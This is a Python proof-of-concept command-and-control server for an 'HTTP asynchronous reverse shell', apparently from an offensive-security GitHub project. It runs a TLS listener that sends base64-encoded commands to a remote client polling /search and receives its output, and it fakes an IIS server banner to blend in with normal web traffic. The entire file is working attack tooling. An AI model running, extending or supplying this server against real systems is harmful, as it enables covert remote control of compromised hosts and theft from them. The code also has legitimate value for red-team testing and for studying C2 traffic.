#!/usr/bin/python
# -*- coding: utf-8 -*-

# HTTP ASYNCHRONE REVERSE SHELL
# Version : 0.1 POC
# Git : https://github.com/onSec-fr

import BaseHTTPServer, SimpleHTTPServer
import ssl
import os
import base64
import threading
import sys
import random

# Config
PORT = 8000
CERT_FILE = '../server.pem'

currEncodedCmd = ""
logFileName = '../logs/logs.txt'

log_file = ""

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    


    # Custom headers
    def _set_headers(self):
        self.send_header("Cache-Control", "private, max-age=0")
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Vary", "Accept-Encoding")
        self.send_header("Connection", "close")
        self.end_headers()
        
    # GET events
    def do_GET(self):
        global currEncodedCmd
        global log_file        
        if self.path.startswith("/search"):
            self.send_response(200)
            self._set_headers()
            self.wfile.write(currEncodedCmd)
            log_file.write("Sent cmd: " + base64.b64decode(currEncodedCmd) + "\n")
            log_file.flush()
            currEncodedCmd = ""
        else:
            self.send_response(404)
            self._set_headers()
            self.wfile.write("Not found")

        # Save logs



    def do_POST(self): 
        global log_file  
        if self.path.startswith("/search"):
            content_length = int(self.headers['Content-Length'])
            resp = base64.b64decode(self.rfile.read(content_length))
            if resp == "EXIT OK":
                stop_server()
            else:
                print(resp)
                log_file.write("Rcv resp: " + resp + "\n")
                log_file.flush()
                self.send_response(200)
                self._set_headers()
                CancelWait()
        else:
            self.send_response(404)
            self._set_headers()
            self.wfile.write("Not found")


    def log_message(self, format, *args):
        global log_file
        log_file.write("%s - - [%s] %s\n" %(self.client_address[0],self.log_date_time_string(),format%args))
        log_file.flush()
    
def CancelWait():
    global wait
    wait = False

class Colors:
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

# Start http server            
def start_server():
    global httpd
    print(Colors.BLUE + '[!] Server listening on port ' + str(PORT) + ', waiting connection from client...' + Colors.END) 
    server_class = BaseHTTPServer.HTTPServer
    MyHandler.server_version = "Microsoft-IIS/8.5"
    MyHandler.sys_version = ""
    httpd = server_class(('0.0.0.0', PORT), MyHandler)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERT_FILE, server_side=True)
    httpd.serve_forever()
 
# Exit
def stop_server():
    print(Colors.YELLOW + '[!] Exit' + Colors.END)
    log_file.close()
    os._exit(1)
    
if __name__ == '__main__':
    try:
        log_file = open(logFileName, 'a+') 
        # Start http server in separate thread
        daemon = threading.Thread(target=start_server)
        daemon.daemon = True
        daemon.start()
        print ""
        while True:
            wait = True
            currcmd = raw_input(">")
            currEncodedCmd = str(base64.b64encode(currcmd.encode("utf-8")))
            # Wait for client's reply
            while (wait == True):
                pass
    except KeyboardInterrupt: 
        stop_server()